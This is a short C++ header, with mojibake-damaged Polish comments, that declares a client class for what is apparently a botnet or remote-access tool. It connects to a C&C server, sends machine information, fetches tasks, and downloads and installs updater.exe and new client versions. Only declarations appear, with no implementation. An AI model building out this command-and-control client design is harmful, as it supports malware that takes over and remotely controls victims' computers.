#include "stdafx.h"

class MachineInfo;

class NewConnection //Nowe po³¹czenie klienckie
{
private:
	bool DownloadUpdater(); //Pobiera updater.exe

	

public:
	SOCKET _socket = NULL; // Przyjmuje wartoœæ po wywo³aniu create_socket()

	bool run_winsock(); // Uruchom winsock 2.0
	
	SOCKET create_socket(); // Po³¹cz siê z C&C, zwraca uchwyt gniazda
	
	bool send_data(std::string http_query); // Wysy³a dane do serwera
	
	std::string check_command(MachineInfo &info); // Zwraca treœæ zadania z serwera

	void close_socket(); //Niszczy gniazdo

	~NewConnection(); //Desktruktor gniazda

	void UpdateClient(); //Pobiera now¹ wersjê klienta i przeprowadza jej instalacjê
};